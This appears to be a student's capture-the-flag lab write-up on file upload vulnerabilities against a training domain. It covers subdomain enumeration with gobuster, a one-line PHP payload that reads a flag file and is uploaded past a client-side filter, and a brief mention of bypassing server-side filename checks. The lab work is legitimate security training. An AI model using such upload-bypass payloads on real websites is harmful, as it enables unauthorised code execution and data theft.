# Task 0

## Find which subdomain contains a web application with an insecure file upload feature.
## Step 1 - Configure hosts
Add the target domain to `/etc/hosts`

---
## Step 2 - Subdomain Enumeration

Tool used:

- gobuster

Command Find hidden virtual hosts/subdomains.:

```bash
gobuster vhost -u http://web0x05.hbtn -w Upload_Vulnerability_Wordlist.txt --append-domain```

test-s3.web0x05.hbtn

---
### Manual Check
Open discovered subdomains in the browser and look for upload...

---
# Task 1

## Bypass a client-side file upload filter and upload a restricted PHP file.

```bash
echo "<?php readfile('FLAG_1.txt') ?>" > flag.php
```
---
# Task 2

## Bypass server-side file upload validation using special characters in the filename.

```text
http://[vuln-subdomain].web0x05.hbtn/task2
```

## Vulnerability

Server-side filename validation bypass.


